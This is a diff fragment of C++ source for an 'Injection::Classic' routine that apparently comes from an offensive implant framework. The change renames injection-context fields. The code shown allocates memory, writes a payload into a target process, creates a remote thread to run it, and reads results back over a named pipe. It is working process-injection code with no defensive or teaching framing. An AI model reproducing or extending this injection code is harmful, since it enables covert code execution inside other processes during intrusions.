@@ -16,18 +16,18 @@ auto DECLFN Injection::Classic(
     ULONG  Success    = FALSE;
     ULONG  FullSize   = 0;
 
-    if ( Kh->InjCtx.Pipe.Boolean ) {
+    if ( Kh->Inj->Ctx.Pipe.Boolean ) {
         FullSize = ( 
-            Size + sizeof( Kh->InjCtx.Pipe.Length ) + Kh->InjCtx.Pipe.Length + 
-            sizeof( Kh->InjCtx.Param.Length ) + Kh->InjCtx.Param.Length
+            Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) + Kh->Inj->Ctx.Pipe.Length + 
+            sizeof( Kh->Inj->Ctx.Param.Length ) + Kh->Inj->Ctx.Param.Length
         );
 
         TmpMem = Kh->Mm->Alloc( 0, 0, FullSize, MEM_COMMIT, PAGE_READWRITE );
         Mem::Copy( TmpMem, Buffer, Size );
-        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size ), &Kh->InjCtx.Pipe.Length, sizeof( Kh->InjCtx.Pipe.Length ) );
-        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Kh->InjCtx.Pipe.Length ) ), Kh->InjCtx.Pipe.Name, Kh->InjCtx.Pipe.Length );
-        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Kh->InjCtx.Pipe.Length ) + Kh->InjCtx.Pipe.Length ), &Kh->InjCtx.Param.Length, sizeof( Kh->InjCtx.Param.Length ) );
-        Mem::Copy( reinterpret_cast<char*>( TmpMem ) + Size + sizeof( Kh->InjCtx.Pipe.Length ) + Kh->InjCtx.Pipe.Length + sizeof(Kh->InjCtx.Param.Length), Kh->InjCtx.Param.Buffer, Kh->InjCtx.Param.Length );
+        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size ), &Kh->Inj->Ctx.Pipe.Length, sizeof( Kh->Inj->Ctx.Pipe.Length ) );
+        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) ), Kh->Inj->Ctx.Pipe.Name, Kh->Inj->Ctx.Pipe.Length );
+        Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) + Kh->Inj->Ctx.Pipe.Length ), &Kh->Inj->Ctx.Param.Length, sizeof( Kh->Inj->Ctx.Param.Length ) );
+        Mem::Copy( reinterpret_cast<char*>( TmpMem ) + Size + sizeof( Kh->Inj->Ctx.Pipe.Length ) + Kh->Inj->Ctx.Pipe.Length + sizeof(Kh->Inj->Ctx.Param.Length), Kh->Inj->Ctx.Param.Buffer, Kh->Inj->Ctx.Param.Length );
     } else {
         FullSize = Size;
         TmpMem   = Buffer;
@@ -36,7 +36,7 @@ auto DECLFN Injection::Classic(
     *Base = Kh->Mm->Alloc( 0, Base, FullSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !*Base ) { Success = FALSE; return Success; }
 
-    if ( Kh->InjCtx.Spawn ) {
+    if ( Kh->Inj->Ctx.Spawn ) {
         Success = Kh->Mm->Write( 0, Base, B_PTR( TmpMem ), FullSize );
         Kh->Mm->Free( 0, TmpMem, FullSize, MEM_RELEASE );
         if ( !Success ) { return Success; }
@@ -51,9 +51,9 @@ auto DECLFN Injection::Classic(
     *ThreadHandle = Kh->Td->Create( 0, Base, Param, 0, 0, &TID );
     if ( !*ThreadHandle ) { Success = FALSE; return Success; }
 
-    if ( Kh->InjCtx.Pipe.Boolean ) {
+    if ( Kh->Inj->Ctx.Pipe.Boolean ) {
         PipeHandle = Kh->Krnl32.CreateFileA( 
-            Kh->InjCtx.Pipe.Name, GENERIC_READ, FILE_SHARE_READ, 0, 
+            Kh->Inj->Ctx.Pipe.Name, GENERIC_READ, FILE_SHARE_READ, 0, 
             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 
         );
         if ( PipeHandle == INVALID_HANDLE_VALUE ) {
